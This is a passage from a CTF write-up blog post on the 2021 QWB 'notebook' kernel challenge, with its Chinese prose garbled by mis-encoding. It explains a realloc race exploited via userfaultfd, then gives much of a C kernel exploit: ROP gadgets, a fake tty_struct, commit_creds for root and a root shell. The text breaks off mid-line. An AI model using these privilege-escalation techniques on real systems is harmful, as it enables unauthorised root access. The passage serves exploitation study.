            "url": "https://squirre17.github.io/2022/09/11/kernel-notebook-three-solutions/",
            "title": "kernel-notebook-three-solutions",
            "date_published": "2022-09-11T02:28:41.000Z",
            "content_html": "<h1 id=\"notebookçš„å¤šç§è§£æ³•\"><a class=\"markdownIt-Anchor\" href=\"#notebookçš„å¤šç§è§£æ³•\">#</a> notebook çš„å¤šç§è§£æ³•</h1>\n<p>2021 QWB</p>\n<p>è¿™ä¸ªé¢˜å°±æ˜¯è€ƒé”æ²¡åŠ å¥½çš„å¤šçº¿ç¨‹æ¡ä»¶ç«äº‰</p>\n<h2 id=\"ä¼ ç»Ÿrop-ptmx\"><a class=\"markdownIt-Anchor\" href=\"#ä¼ ç»Ÿrop-ptmx\">#</a> ä¼ ç»Ÿ ROP -ptmx</h2>\n<p>åˆ©ç”¨ realloc æŒ‡é’ˆå»¶è¿Ÿå›å†™çš„æ•ˆæœ å°† free çš„å—å›å†™å›æ§åˆ¶åŒº</p>\n<p>é€ æˆå¯¹ tty struct ç»“æ„ä½“çš„æ§åˆ¶</p>\n<p>ç„¶åæ³„æ¼ kernel base</p>\n<p>å¹¶ä¸¤æ®µæ ˆè¿ç§» (æµ‹è¯•è¿‡ ä¸€æ®µè¿ç§»ä¸è¡Œ ä¼šå¡åœ¨ä¸€ä¸ªåœ°æ–¹)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">noteedit</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> newsize, <span class=\"type\">void</span> *buf)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// r13</span></span><br><span class=\"line\">  note *v5; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// r12</span></span><br><span class=\"line\">  __int64 v8; <span class=\"comment\">// rbx</span></span><br><span class=\"line\"></span><br><span class=\"line\">  (Â·Â·Â·)</span><br><span class=\"line\">  </span><br><span class=\"line\">  v4 = v3;</span><br><span class=\"line\">  v5 = &amp;notebook[idx];</span><br><span class=\"line\">  raw_read_lock(&amp;lock);                      [<span class=\"number\">1</span>] &lt;&lt;- åŠ äº†è¯»é”</span><br><span class=\"line\">  size = v5-&gt;size;<span class=\"comment\">// sizeæ˜¯åŸsize</span></span><br><span class=\"line\">  v5-&gt;size = newsize;<span class=\"comment\">// ç«‹åˆ»æ”¹æˆäº†æˆ‘ä»¬è¾“å…¥çš„æ–°size</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size == newsize )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v8 = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> editout;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// è¿™é‡Œä¼šæŠŠnotefree å´æ²¡ç«‹åˆ»ç½®ç©º</span></span><br><span class=\"line\">  v7 = (*(__int64 (__fastcall **)(<span class=\"type\">void</span> *, <span class=\"type\">size_t</span>, __int64))krealloc.gap0)(v5-&gt;note, newsize, <span class=\"number\">37748928LL</span>);</span><br><span class=\"line\">  copy_from_user(name, v4, <span class=\"number\">256LL</span>);           [<span class=\"number\">2</span>] &lt;&lt;- è¿™é‡Œå¯ä»¥uffd</span><br><span class=\"line\">  <span class=\"title function_\">if</span> <span class=\"params\">( !v5-&gt;size )</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printk(<span class=\"string\">&quot;free in fact&quot;</span>);</span><br><span class=\"line\">    v5-&gt;note = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    v8 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> editout;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)_virt_addr_valid(v7) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5-&gt;note = (<span class=\"type\">void</span> *)v7;                   [<span class=\"number\">3</span>] &lt;&lt;- è¿™é‡Œå†™å›note</span><br><span class=\"line\">    v8 = <span class=\"number\">2LL</span>;</span><br><span class=\"line\">editout:</span><br><span class=\"line\">    raw_read_unlock(&amp;lock);</span><br><span class=\"line\">    printk(<span class=\"string\">&quot;[o] Edit success. %s edit a note.\\n&quot;</span>, name);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> v8;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  printk(<span class=\"string\">&quot;[x] Return ptr unvalid.\\n&quot;</span>);</span><br><span class=\"line\">  raw_read_unlock(&amp;lock);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">3LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2022/09/11/kernel-notebook-three-solutions/1.png\" alt=\"Pasted image 20220910152111\"></p>\n<p>exp</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pthread.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;include/head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 1024</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">uint64_t</span> u64;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">uint32_t</span> u32;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> uffd, note_fd;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> mod_base_addr, cookie ,kernel_base_addr;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> fault_page, fault_page_len;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> target, modprobe_path;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> errExit(msg) &#123; \\</span></span><br><span class=\"line\"><span class=\"meta\">\tperror(msg);       \\</span></span><br><span class=\"line\"><span class=\"meta\">\texit(1);\t\t   \\</span></span><br><span class=\"line\"><span class=\"meta\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> idx;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> size;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> buf;</span><br><span class=\"line\">&#125;userarg;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAX_ELEM 0x100</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">enum</span>&#123;</span> </span><br><span class=\"line\">\tSWAPGS_POP_RET, IRETQ, COMMIT_CREDS,</span><br><span class=\"line\">\tPREPARE_KERNEL_CRED, </span><br><span class=\"line\">\tSUB_RSP_RET ,PUSH_RDI_POP_RSP_POP_RET,</span><br><span class=\"line\">\tPOP_RDI ,POP_RSP,</span><br><span class=\"line\">\tMOV_RDI_RAX_POP_RET,</span><br><span class=\"line\">\tTERMINATOR</span><br><span class=\"line\">&#125;;<span class=\"comment\">//PREPARE_KERNEL_CRED, COMMIT_CREDS, &#125;;</span></span><br><span class=\"line\">u64 a[MAX_ELEM];</span><br><span class=\"line\"><span class=\"comment\">//tty_structç»“æ„ä½“çš„å¤§å°</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class=\"line\"><span class=\"comment\">//å¦‚æœæˆ‘ä»¬ç”³è¯·0x2E0çš„ç©ºé—´ï¼Œslabåˆ†é…çš„å †å®é™…å¤§å°ä¸º0x400 </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> REAL_HEAP_SIZE 0x400</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> RAW_KERNEL_BASE 0xffffffff81000000</span></span><br><span class=\"line\"><span class=\"type\">int</span> protect1[<span class=\"number\">0x1000</span>];</span><br><span class=\"line\"><span class=\"type\">int</span> ptmx_fds[<span class=\"number\">0x100</span>];<span class=\"comment\">// æµ‹äº†æˆ‘å¾ˆä¹…æ‰å‘ç°è¿™ä¸ªbè¢«ä¸çŸ¥é“è°æº¢å‡ºäº† åŠ ä¸¤ä¸ªä¿æŠ¤æŒ¡ä¸€ä¸‹</span></span><br><span class=\"line\"><span class=\"type\">int</span> protect2[<span class=\"number\">0x1000</span>];</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">init</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\ta[SWAPGS_POP_RET] \t\t\t= <span class=\"number\">0xffffffff810637d4</span>;</span><br><span class=\"line\">\ta[IRETQ] \t\t\t\t\t= <span class=\"number\">0xffffffff810338bb</span>;</span><br><span class=\"line\">\ta[COMMIT_CREDS] \t\t\t= <span class=\"number\">0xffffffff810a9b40</span>;</span><br><span class=\"line\">\ta[PREPARE_KERNEL_CRED]\t\t= <span class=\"number\">0xffffffff810a9ef0</span>;</span><br><span class=\"line\">\ta[SUB_RSP_RET] \t\t\t\t= <span class=\"number\">0xffffffff8100354f</span>;</span><br><span class=\"line\">\ta[PUSH_RDI_POP_RSP_POP_RET] = <span class=\"number\">0xffffffff8143f4e1</span>;</span><br><span class=\"line\">\ta[POP_RDI]\t\t\t\t    = <span class=\"number\">0xffffffff81007115</span>;</span><br><span class=\"line\">\ta[POP_RSP] \t\t\t\t\t= <span class=\"number\">0xffffffff810bc110</span>;</span><br><span class=\"line\">\ta[MOV_RDI_RAX_POP_RET]\t\t= <span class=\"number\">0xffffffff81045833</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">addKernelBase</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; TERMINATOR ;i++)&#123;</span><br><span class=\"line\">\t\ta[i] += kernel_base_addr - <span class=\"number\">0xffffffff81000000</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getshell</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;UID is %d&quot;</span>, getuid());</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\tDone(<span class=\"string\">&quot;Get shell&quot;</span>);</span><br><span class=\"line\">\t\tsystem(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\tPanic(<span class=\"string\">&quot;Get shell failed&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 user_cs, user_ss, user_sp, user_flags;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">saveState</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t__asm__ (</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %cs, user_cs;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %ss, user_ss;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;pushf;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;pop user_flags;&quot;</span></span><br><span class=\"line\">\t);</span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;saveState&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getRoot</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\t<span class=\"type\">void</span> *(*pkc)(<span class=\"type\">int</span>) = (<span class=\"type\">void</span> *(*)(<span class=\"type\">int</span>))(a[PREPARE_KERNEL_CRED]);</span><br><span class=\"line\">\t<span class=\"type\">void</span> (*cc)(<span class=\"type\">void</span> *) = (<span class=\"type\">void</span> (*)(<span class=\"type\">void</span> *))(a[COMMIT_CREDS]);</span><br><span class=\"line\">\t(*cc)((*pkc)(<span class=\"literal\">NULL</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">add</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> size, <span class=\"type\">void</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)size;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x100</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">del</span><span class=\"params\">(<span class=\"type\">size_t</span> idx)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x200</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">edit</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> newsize, <span class=\"type\">char</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)newsize;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x300</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">gift</span><span class=\"params\">(<span class=\"type\">char</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">100</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_to_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\twrite(note_fd, user_buf, idx);<span class=\"comment\">// é€†å‘ mynote_readå¯ä»¥å¾—åˆ°</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">read_from_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\tread(note_fd, user_buf, idx);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">char</span> *buf;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">void</span> *buf;</span><br><span class=\"line\">\tu64 size;</span><br><span class=\"line\">&#125;notebook;</span><br><span class=\"line\"></span><br><span class=\"line\">notebook ntbk[<span class=\"number\">10</span>];</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> heap[<span class=\"number\">2</span>];</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> notebook_addr;</span><br><span class=\"line\">u64 fake_tty_struct[<span class=\"number\">128</span>];</span><br><span class=\"line\">u64 fake_tty_ops[<span class=\"number\">128</span>];</span><br><span class=\"line\"><span class=\"type\">char</span> zero[PAGE_SIZE] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tinit();</span><br><span class=\"line\">\tsaveState();</span><br><span class=\"line\"></span><br><span class=\"line\">\tnote_fd = open(<span class=\"string\">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;note_fd is %d&quot;</span>,note_fd);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(note_fd &lt; <span class=\"number\">0</span>) errExit(<span class=\"string\">&quot;open&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tbuf = <span class=\"built_in\">calloc</span>(<span class=\"number\">1</span>, <span class=\"number\">0x100</span>);<span class=\"comment\">// nameçš„é•¿åº¦</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tFILE * stream = popen(<span class=\"string\">&quot;cat 